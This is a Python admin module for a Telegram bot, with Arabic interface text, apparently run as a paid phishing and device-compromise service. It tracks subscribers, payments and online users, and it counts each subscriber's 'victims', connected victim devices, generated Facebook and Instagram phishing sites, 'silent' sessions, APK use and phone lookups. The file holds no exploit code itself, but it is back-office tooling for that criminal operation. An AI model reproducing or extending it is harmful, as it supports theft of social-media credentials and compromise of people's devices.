# admin_system.py
# ============================================================
# نظام الأدمن المتطور — v2.1
# Live Tracking + Analytics + Full Control
# (الصيانة مخفية من الـ UI لكن الدوال موجودة)
# ============================================================

import io
import json
import time
import threading
from datetime import datetime, timedelta
from collections import Counter

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from config import redis_client, bot
from logging_config import get_logger
from monitoring import metrics

logger = get_logger("admin_system")


# ============================================================
# Redis Keys
# ============================================================
KEY_MAINTENANCE = "system:maintenance"
KEY_MAINTENANCE_MSG = "system:maintenance_msg"
KEY_MAINTENANCE_STARTED = "system:maintenance_started"
KEY_START_TIME = "system:start_time"
KEY_ONLINE_USERS = "system:online_users"


# ============================================================
# [1] Live User Tracking
# ============================================================
def track_user_activity(user_id, action, extra=None):
    """يسجل نشاط أي مستخدم في real-time"""
    if not redis_client:
        return

    try:
        now = time.time()
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # ─── آخر نشاط ───
        redis_client.setex(
            f"user_activity:{user_id}:last",
            3600,
            json.dumps({
                "action": action,
                "extra": extra or {},
                "timestamp": now,
                "time_str": now_str,
            }, ensure_ascii=False)
        )

        # ─── سجل الأنشطة ───
        redis_client.lpush(
            f"user_activity:{user_id}:log",
            json.dumps({
                "action": action,
                "extra": extra or {},
                "timestamp": now,
                "time_str": now_str,
            }, ensure_ascii=False)
        )
        redis_client.ltrim(f"user_activity:{user_id}:log", 0, 99)
        redis_client.expire(f"user_activity:{user_id}:log", 86400 * 7)

        # ─── Online Users ───
        redis_client.zadd(KEY_ONLINE_USERS, {str(user_id): now})
        cutoff = now - 300
        redis_client.zremrangebyscore(KEY_ONLINE_USERS, 0, cutoff)
        redis_client.expire(KEY_ONLINE_USERS, 3600)

        # ─── Global Activity Log ───
        redis_client.lpush(
            "system:activity_log",
            json.dumps({
                "user_id": user_id,
                "action": action,
                "extra": extra or {},
                "timestamp": now,
                "time_str": now_str,
            }, ensure_ascii=False)
        )
        redis_client.ltrim("system:activity_log", 0, 499)
        redis_client.expire("system:activity_log", 86400 * 7)

        # ─── Counters ───
        today = datetime.utcnow().strftime("%Y-%m-%d")
        redis_client.hincrby(f"system:tool_usage:{today}", action, 1)
        redis_client.expire(f"system:tool_usage:{today}", 86400 * 30)

    except Exception as e:
        logger.debug(f"track_user_activity error: {e}")


def get_user_activity(user_id):
    if not redis_client:
        return None
    try:
        raw = redis_client.get(f"user_activity:{user_id}:last")
        if raw:
            return json.loads(raw)
    except Exception:
        pass
    return None


def get_user_activity_log(user_id, limit=20):
    if not redis_client:
        return []
    try:
        items = redis_client.lrange(f"user_activity:{user_id}:log", 0, limit - 1) or []
        result = []
        for item in items:
            try:
                result.append(json.loads(item) if isinstance(item, str) else item)
            except Exception:
                pass
        return result
    except Exception:
        return []


def get_online_users():
    if not redis_client:
        return []
    try:
        now = time.time()
        cutoff = now - 300
        online = redis_client.zrangebyscore(KEY_ONLINE_USERS, cutoff, now)
        return [(int(uid), redis_client.zscore(KEY_ONLINE_USERS, uid)) for uid in online]
    except Exception:
        return []


def get_online_count():
    return len(get_online_users())


def is_user_online(user_id):
    if not redis_client:
        return False
    try:
        score = redis_client.zscore(KEY_ONLINE_USERS, str(user_id))
        if score:
            return (time.time() - float(score)) < 300
    except Exception:
        pass
    return False


# ============================================================
# [2] Deep Analytics
# ============================================================
def get_tool_usage_today():
    if not redis_client:
        return {}
    try:
        today = datetime.utcnow().strftime("%Y-%m-%d")
        usage = redis_client.hgetall(f"system:tool_usage:{today}") or {}
        return {k: int(v) for k, v in usage.items()}
    except Exception:
        return {}


def get_top_users(limit=10, period="day"):
    if not redis_client:
        return []

    try:
        users = redis_client.smembers("all_users") or set()
        counter = Counter()

        for uid in users:
            try:
                log_count = redis_client.llen(f"user_activity:{uid}:log") or 0
                last_raw = redis_client.get(f"user_activity:{uid}:last")
                if last_raw:
                    last = json.loads(last_raw)
                    last_ts = last.get("timestamp", 0)
                else:
                    last_ts = 0

                cutoff = time.time() - (86400 if period == "day" else 604800)
                if last_ts > cutoff:
                    counter[uid] = log_count
            except Exception:
                continue

        return counter.most_common(limit)

    except Exception as e:
        logger.exception(f"get_top_users error: {e}")
        return []


def get_conversion_stats():
    if not redis_client:
        return {"total": 0, "free": 0, "paid": 0, "rate": 0}

    try:
        users = redis_client.smembers("all_users") or set()
        total = len(users)
        paid = 0
        free = 0

        for uid in users:
            try:
                raw = redis_client.get(f"user:{uid}")
                if not raw:
                    continue
                u = json.loads(raw)

                has_sub = False
                if u.get("subscription"):
                    try:
                        expires = datetime.fromisoformat(u["subscription"]["expires_at"])
                        if expires > datetime.utcnow():
                            has_sub = True
                    except Exception:
                        pass

                if u.get("is_vip") or has_sub:
                    paid += 1
                else:
                    free += 1
            except Exception:
                continue

        rate = (paid / total * 100) if total > 0 else 0
        return {"total": total, "free": free, "paid": paid, "rate": round(rate, 1)}

    except Exception as e:
        logger.exception(f"get_conversion_stats error: {e}")
        return {"total": 0, "free": 0, "paid": 0, "rate": 0}


def get_recent_activity(limit=30):
    if not redis_client:
        return []
    try:
        items = redis_client.lrange("system:activity_log", 0, limit - 1) or []
        result = []
        for item in items:
            try:
                result.append(json.loads(item) if isinstance(item, str) else item)
            except Exception:
                pass
        return result
    except Exception:
        return []


# ============================================================
# [3] User Deep Info
# ============================================================
def get_user_full_info(user_id):
    info = {
        "user_id": user_id, "found": False, "data": None,
        "activity": None, "activity_log": [], "is_online": False,
        "usage_today": 0, "victims_count": 0,
        "created_fb_sites": 0, "created_ig_sites": 0,
        "phone_searches": 0, "payments_count": 0, "total_spent": 0,
    }

    if not redis_client:
        return info

    try:
        raw = redis_client.get(f"user:{user_id}")
        if not raw:
            return info

        info["found"] = True
        u = json.loads(raw)
        info["data"] = u

        info["activity"] = get_user_activity(user_id)
        info["activity_log"] = get_user_activity_log(user_id, limit=20)
        info["is_online"] = is_user_online(user_id)
        info["usage_today"] = u.get("daily_uses_count", 0)

        try:
            victims = redis_client.smembers(f"victims:{user_id}") or set()
            info["victims_count"] = len(victims)
        except Exception:
            pass

        try:
            sessions = redis_client.lrange(f"se_user_sessions:{user_id}", 0, 999) or []
            for sid in sessions:
                try:
                    sdata_raw = redis_client.get(f"se_session:{sid}")
                    if sdata_raw:
                        sdata = json.loads(sdata_raw)
                        s_type = sdata.get("type")
                        if s_type == "facebook":
                            info["created_fb_sites"] += 1
                        elif s_type == "instagram":
                            info["created_ig_sites"] += 1
                except Exception:
                    continue
        except Exception:
            pass

        try:
            info["phone_searches"] = redis_client.llen(f"phone_searches:{user_id}") or 0
        except Exception:
            pass

        try:
            purchases = u.get("purchases", [])
            info["payments_count"] = len(purchases)
            info["total_spent"] = u.get("total_stars_spent", 0)
        except Exception:
            pass

    except Exception as e:
        logger.exception(f"get_user_full_info error: {e}")

    return info


# ============================================================
# [4] Maintenance (مخفية من الـ UI)
# ============================================================
def is_maintenance():
    if not redis_client:
        return False
    try:
        return bool(redis_client.get(KEY_MAINTENANCE))
    except Exception:
        return False


def enable_maintenance(custom_msg=None, admin_id=None):
    if not redis_client:
        return False
    try:
        pipe = redis_client.pipeline()
        pipe.set(KEY_MAINTENANCE, "1")
        pipe.set(KEY_MAINTENANCE_STARTED, str(time.time()))

        if custom_msg:
            pipe.set(KEY_MAINTENANCE_MSG, custom_msg)
        else:
            pipe.set(
                KEY_MAINTENANCE_MSG,
                "🛠️ <b>البوت تحت الصيانة المؤقتة</b>\n"
                "━━━━━━━━━━━━━━━━━━\n\n"
                "نعمل حالياً على تحديثات مهمة.\n"
                "سيتم إعادة تشغيل البوت قريباً.\n\n"
                "🔔 <i>نعتذر عن الإزعاج</i>\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "⚡ K_J6 Team"
            )
        pipe.execute()

        metrics.inc_counter("maintenance_enabled")
        logger.warning(f"🛠️ Maintenance ENABLED by {admin_id}")
        return True
    except Exception as e:
        logger.exception(f"enable_maintenance error: {e}")
        return False


def disable_maintenance(admin_id=None):
    if not redis_client:
        return False
    try:
        pipe = redis_client.pipeline()
        pipe.delete(KEY_MAINTENANCE)
        pipe.delete(KEY_MAINTENANCE_STARTED)
        pipe.execute()

        metrics.inc_counter("maintenance_disabled")
        logger.info(f"✅ Maintenance DISABLED by {admin_id}")
        return True
    except Exception as e:
        logger.exception(f"disable_maintenance error: {e}")
        return False


def get_maintenance_message():
    if not redis_client:
        return None
    try:
        return redis_client.get(KEY_MAINTENANCE_MSG)
    except Exception:
        return None


def set_maintenance_message(message, admin_id=None):
    if not redis_client:
        return False
    try:
        redis_client.set(KEY_MAINTENANCE_MSG, message)
        return True
    except Exception:
        return False


def get_maintenance_duration():
    if not redis_client:
        return 0
    try:
        started = redis_client.get(KEY_MAINTENANCE_STARTED)
        if started:
            return int(time.time() - float(started))
    except Exception:
        pass
    return 0


# ============================================================
# [5] System Stats
# ============================================================
def get_system_stats():
    stats = {
        "total_users": 0, "new_users_24h": 0, "banned_users": 0,
        "vip_users": 0, "online_now": 0,
        "total_victims": 0, "online_victims": 0,
        "total_sessions": 0, "total_silent": 0, "total_phone_searches": 0,
        "uptime_seconds": 0, "redis_memory_mb": 0, "redis_keys": 0,
    }

    if not redis_client:
        return stats

    try:
        try:
            users = redis_client.smembers("all_users") or set()
            stats["total_users"] = len(users)
            now = time.time()

            for uid in users:
                try:
                    raw = redis_client.get(f"user:{uid}")
                    if not raw:
                        continue
                    u = json.loads(raw)
                    if u.get("is_banned"):
                        stats["banned_users"] += 1
                    if u.get("is_vip"):
                        stats["vip_users"] += 1

                    created = u.get("created_at", "")
                    if created:
                        try:
                            created_ts = datetime.fromisoformat(created).timestamp()
                            if now - created_ts < 86400:
                                stats["new_users_24h"] += 1
                        except Exception:
                            pass
                except Exception:
                    continue
        except Exception:
            pass

        stats["online_now"] = get_online_count()

        try:
            victim_keys = redis_client.keys("victim:*:*") or []
            stats["total_victims"] = len(victim_keys)

            for key in victim_keys[:500]:
                try:
                    v = redis_client.hgetall(key)
                    if v.get("status") == "active":
                        last_seen = v.get("last_seen", "0")
                        if last_seen and time.time() - float(last_seen) < 300:
                            stats["online_victims"] += 1
                except Exception:
                    continue
        except Exception:
            pass

        try:
            stats["total_sessions"] = len(redis_client.keys("se_session:*") or [])
            stats["total_silent"] = len(redis_client.keys("silent:*") or [])
            stats["total_phone_searches"] = len(redis_client.keys("phone_search:*") or [])
        except Exception:
            pass

        try:
            start = redis_client.get(KEY_START_TIME)
            if start:
                stats["uptime_seconds"] = int(time.time() - float(start))
            else:
                redis_client.set(KEY_START_TIME, str(time.time()))
        except Exception:
            pass

        try:
            info = redis_client.info("memory")
            stats["redis_memory_mb"] = round(info.get("used_memory", 0) / 1024 / 1024, 2)
            stats["redis_keys"] = redis_client.dbsize()
        except Exception:
            pass

    except Exception as e:
        logger.exception(f"get_system_stats error: {e}")

    return stats


def format_uptime(seconds):
    if seconds < 60:
        return f"{int(seconds)}ث"
    if seconds < 3600:
        return f"{int(seconds / 60)}د"
    if seconds < 86400:
        return f"{int(seconds / 3600)}س {int((seconds % 3600) / 60)}د"
    return f"{int(seconds / 86400)}ي {int((seconds % 86400) / 3600)}س"


# ============================================================
# [6] ★ Admin Menu — بدون زر صيانة ★
# ============================================================
def build_advanced_admin_menu():
    """لوحة الأدمن المتطورة — الصيانة مخفية"""
    m = InlineKeyboardMarkup()

    # ❌ لا يوجد زر صيانة

    # ─── Live Monitor ───
    m.row(
        InlineKeyboardButton("🔴 مراقبة مباشرة", callback_data="admin_live"),
        InlineKeyboardButton("📊 إحصائيات حية", callback_data="admin_adv_stats"),
    )

    # ─── تحليلات ───
    m.row(
        InlineKeyboardButton("📈 تحليلات عميقة", callback_data="admin_analytics"),
        InlineKeyboardButton("👑 أكثر المستخدمين", callback_data="admin_top_users"),
    )

    # ─── المستخدمون ───
    m.row(
        InlineKeyboardButton("👥 قائمة المستخدمين", callback_data="admin_users_0"),
        InlineKeyboardButton("🔍 بحث", callback_data="admin_search"),
    )

    m.row(
        InlineKeyboardButton("💎 منح VIP", callback_data="admin_grant_vip"),
        InlineKeyboardButton("➕ إعطاء اشتراك", callback_data="admin_add_sub"),
    )

    m.row(
        InlineKeyboardButton("🚫 حظر", callback_data="admin_ban"),
        InlineKeyboardButton("✅ فك حظر", callback_data="admin_unban"),
    )

    m.row(
        InlineKeyboardButton("🗑️ حذف", callback_data="admin_delete"),
        InlineKeyboardButton("⭐ نجوم", callback_data="admin_give_stars"),
    )

    # ─── الأدوات ───
    m.row(
        InlineKeyboardButton("⚙️ إدارة التحديثات", callback_data="admin_updates"),
        InlineKeyboardButton("📢 رسالة جماعية", callback_data="admin_broadcast"),
    )

    m.row(
        InlineKeyboardButton("📋 سجل الأحداث", callback_data="admin_events"),
        InlineKeyboardButton("📡 سجل الأنشطة", callback_data="admin_activity_log"),
    )

    m.row(
        InlineKeyboardButton("🧹 تنظيف Redis", callback_data="admin_clean_redis"),
        InlineKeyboardButton("📥 تصدير", callback_data="admin_export"),
    )

    # ─── إعدادات ───
    m.row(InlineKeyboardButton("🔧 إعدادات النظام", callback_data="admin_settings"))

    m.row(InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="back_to_main"))

    return m


# ============================================================
# [7] Reports
# ============================================================
def build_admin_stats_text():
    stats = get_system_stats()
    conversion = get_conversion_stats()

    text = (
        "📊 <b>إحصائيات النظام الحية</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🕐 <code>{datetime.now().strftime('%H:%M:%S')}</code>\n\n"

        "━━━ 👥 المستخدمون ━━━\n"
        f"📊 <b>الإجمالي:</b> <code>{stats['total_users']}</code>\n"
        f"🔴 <b>Online الآن:</b> <code>{stats['online_now']}</code>\n"
        f"🆕 <b>جدد 24س:</b> <code>{stats['new_users_24h']}</code>\n"
        f"💎 <b>VIP:</b> <code>{stats['vip_users']}</code>\n"
        f"🚫 <b>محظورين:</b> <code>{stats['banned_users']}</code>\n\n"

        "━━━ 💰 التحويل ━━━\n"
        f"✅ <b>مدفوع:</b> <code>{conversion['paid']}</code>\n"
        f"🆓 <b>مجاني:</b> <code>{conversion['free']}</code>\n"
        f"📈 <b>معدل:</b> <code>{conversion['rate']}%</code>\n\n"

        "━━━ 🎯 الضحايا ━━━\n"
        f"📱 <b>الإجمالي:</b> <code>{stats['total_victims']}</code>\n"
        f"🟢 <b>متصلين:</b> <code>{stats['online_victims']}</code>\n\n"

        "━━━ 🌐 الأدوات ━━━\n"
        f"📘 <b>Sessions:</b> <code>{stats['total_sessions']}</code>\n"
        f"🎯 <b>Silent:</b> <code>{stats['total_silent']}</code>\n"
        f"📱 <b>Phone Searches:</b> <code>{stats['total_phone_searches']}</code>\n\n"

        "━━━ ⚙️ النظام ━━━\n"
        f"⏱️ <b>Uptime:</b> <code>{format_uptime(stats['uptime_seconds'])}</code>\n"
        f"💾 <b>Redis:</b> <code>{stats['redis_memory_mb']} MB</code>\n"
        f"🔑 <b>Keys:</b> <code>{stats['redis_keys']}</code>\n"
    )

    return text


def build_live_monitor_text():
    online_users = get_online_users()
    tool_usage = get_tool_usage_today()

    text = (
        "🔴 <b>المراقبة المباشرة</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🕐 <code>{datetime.now().strftime('%H:%M:%S')}</code>\n\n"
        f"👥 <b>Online الآن:</b> <code>{len(online_users)}</code>\n\n"
        "━━━ 📡 أدوات مستخدمة اليوم ━━━\n"
    )

    if not tool_usage:
        text += "<i>لا يوجد نشاط اليوم</i>\n"
    else:
        top_tools = sorted(tool_usage.items(), key=lambda x: x[1], reverse=True)[:10]
        for tool, count in top_tools:
            emoji = {
                "start": "🚀", "message": "💬", "tool_open": "🎯",
                "payment": "💰", "fb_site": "📘", "ig_site": "📷",
                "phone_search": "📱", "silent": "🎯", "apk": "📦",
            }.get(tool, "•")
            text += f"{emoji} <b>{h(tool)}:</b> <code>{count}</code>\n"

    text += "\n━━━ 🌐 آخر 10 أنشطة ━━━\n"

    recent = get_recent_activity(limit=10)
    if not recent:
        text += "<i>لا يوجد</i>"
    else:
        for ev in recent:
            uid = ev.get("user_id", "?")
            action = ev.get("action", "?")
            ts = ev.get("time_str", "?")[11:19]
            text += f"• <code>{ts}</code> — <code>{h(str(uid))[:10]}</code> — <b>{h(action)}</b>\n"

    return text


def build_analytics_text():
    tool_usage = get_tool_usage_today()
    conversion = get_conversion_stats()

    text = (
        "📈 <b>التحليلات العميقة</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "━━━ 📊 استخدام الأدوات ━━━\n"
    )

    if not tool_usage:
        text += "<i>لا يوجد بيانات</i>\n"
    else:
        total = sum(tool_usage.values())
        top_tools = sorted(tool_usage.items(), key=lambda x: x[1], reverse=True)[:15]

        for tool, count in top_tools:
            percent = (count / total * 100) if total > 0 else 0
            bar = "█" * int(percent / 5)
            text += f"<b>{h(tool)}</b>\n"
            text += f"<code>{count}</code> ({percent:.1f}%) {bar}\n\n"

        text += f"━━━ 📊 الإجمالي: <code>{total}</code> ━━━\n\n"

    text += (
        "━━━ 💰 التحويل ━━━\n"
        f"• إجمالي: <code>{conversion['total']}</code>\n"
        f"• مدفوع: <code>{conversion['paid']}</code>\n"
        f"• مجاني: <code>{conversion['free']}</code>\n"
        f"• معدل: <code>{conversion['rate']}%</code>\n"
    )

    return text


def build_top_users_text():
    top = get_top_users(limit=15, period="day")

    if not top:
        return "👑 <b>لا يوجد بيانات بعد</b>"

    text = (
        "👑 <b>أكثر المستخدمين نشاطاً (24س)</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
    )

    for i, (uid, count) in enumerate(top, 1):
        try:
            raw = redis_client.get(f"user:{uid}")
            u = json.loads(raw) if raw else {}
            name = u.get("first_name", "Unknown")[:20]
            online = "🔴" if is_user_online(uid) else "⚪"
            text += (
                f"{i}. {online} <b>{h(name)}</b>\n"
                f"   🆔 <code>{uid}</code> — <code>{count}</code> نشاط\n\n"
            )
        except Exception:
            text += f"{i}. <code>{uid}</code> — {count}\n"

    return text


def build_user_full_info_text(uid):
    info = get_user_full_info(uid)

    if not info["found"]:
        return f"❌ <b>المستخدم {uid} غير موجود</b>"

    u = info["data"]
    activity = info["activity"] or {}

    if is_admin(uid):
        status = "👑 أدمن"
    elif u.get("is_banned"):
        status = "🚫 محظور"
    elif u.get("is_vip"):
        status = "💎 VIP"
    elif u.get("subscription"):
        try:
            expires = datetime.fromisoformat(u["subscription"]["expires_at"])
            if expires > datetime.utcnow():
                days = (expires - datetime.utcnow()).days
                status = f"✅ مشترك ({days} يوم)"
            else:
                status = "❌ اشتراك منتهي"
        except Exception:
            status = "❓"
    else:
        status = "🆓 مجاني"

    online_status = "🔴 متصل الآن" if info["is_online"] else "⚪ غير متصل"

    last_action = "—"
    last_time = "—"
    if activity:
        last_action = activity.get("action", "—")
        last_time = activity.get("time_str", "—")

    text = (
        f"👤 <b>معلومات المستخدم الكاملة</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 <b>ID:</b> <code>{uid}</code>\n"
        f"👋 <b>الاسم:</b> {h(u.get('first_name', 'Unknown'))}\n"
        f"📝 <b>Username:</b> @{h(u.get('username', 'N/A'))}\n"
        f"📊 <b>الحالة:</b> {status}\n"
        f"🔴 <b>Online:</b> {online_status}\n\n"
        f"━━━ 🕐 آخر نشاط ━━━\n"
        f"• <b>النشاط:</b> <code>{h(str(last_action))}</code>\n"
        f"• <b>الوقت:</b> <code>{h(str(last_time))}</code>\n\n"
        f"━━━ 📊 الاستخدام ━━━\n"
        f"• <b>اليوم:</b> <code>{info['usage_today']}</code>\n"
        f"• <b>الضحايا:</b> <code>{info['victims_count']}</code>\n"
        f"• <b>FB Sites:</b> <code>{info['created_fb_sites']}</code>\n"
        f"• <b>IG Sites:</b> <code>{info['created_ig_sites']}</code>\n"
        f"• <b>Phone Searches:</b> <code>{info['phone_searches']}</code>\n\n"
        f"━━━ 💰 المدفوعات ━━━\n"
        f"• <b>عدد:</b> <code>{info['payments_count']}</code>\n"
        f"• <b>إجمالي:</b> <code>{info['total_spent']} ⭐</code>\n\n"
    )

    if info["activity_log"]:
        text += "━━━ 📡 آخر 10 أنشطة ━━━\n"
        for log in info["activity_log"][:10]:
            t = log.get("time_str", "?")[11:19]
            a = log.get("action", "?")
            text += f"• <code>{h(t)}</code> — <b>{h(a)}</b>\n"

    if u.get("notes"):
        text += f"\n📝 <b>ملاحظات:</b> {h(u['notes'])}"

    return text


# ============================================================
# [8] Helpers
# ============================================================
def is_admin(user_id):
    try:
        from imports_manager import is_admin as _is_admin
        return _is_admin(user_id)
    except Exception:
        return False


def h(text):
    import html as _html
    if text is None:
        return ""
    return _html.escape(str(text))


# ============================================================
# [9] Cleaning
# ============================================================
def clean_redis_cache():
    if not redis_client:
        return {"cleaned": 0, "errors": 0}

    cleaned = 0
    errors = 0

    try:
        patterns = ["dash_magic:*", "phone_search:*", "lsh_active:*"]
        for pattern in patterns:
            try:
                keys = redis_client.keys(pattern) or []
                for key in keys[:500]:
                    try:
                        ttl = redis_client.ttl(key)
                        if ttl == -1 or ttl == -2:
                            redis_client.delete(key)
                            cleaned += 1
                    except Exception:
                        errors += 1
            except Exception:
                errors += 1

        metrics.inc_counter("redis_cleaned", value=cleaned)
    except Exception as e:
        logger.exception(f"clean_redis_cache error: {e}")

    return {"cleaned": cleaned, "errors": errors}


# ============================================================
# [10] Events
# ============================================================
def log_admin_event(admin_id, event_type, details=""):
    if not redis_client:
        return
    try:
        event = {
            "admin_id": admin_id,
            "type": event_type,
            "details": details,
            "timestamp": time.time(),
            "time_str": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        redis_client.lpush("admin_events", json.dumps(event, ensure_ascii=False))
        redis_client.ltrim("admin_events", 0, 199)
        redis_client.expire("admin_events", 86400 * 30)
    except Exception:
        pass


def get_admin_events(limit=30):
    if not redis_client:
        return []
    try:
        items = redis_client.lrange("admin_events", 0, limit - 1) or []
        return [json.loads(i) if isinstance(i, str) else i for i in items]
    except Exception:
        return []


# ============================================================
# [11] Export
# ============================================================
def export_all_users():
    if not redis_client:
        return None
    try:
        users = redis_client.smembers("all_users") or set()
        export = {
            "exported_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "total_users": len(users),
            "users": [],
        }
        for uid in list(users)[:500]:
            try:
                raw = redis_client.get(f"user:{uid}")
                if raw:
                    export["users"].append(json.loads(raw))
            except Exception:
                continue
        return json.dumps(export, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.exception(f"export_all_users error: {e}")
        return None
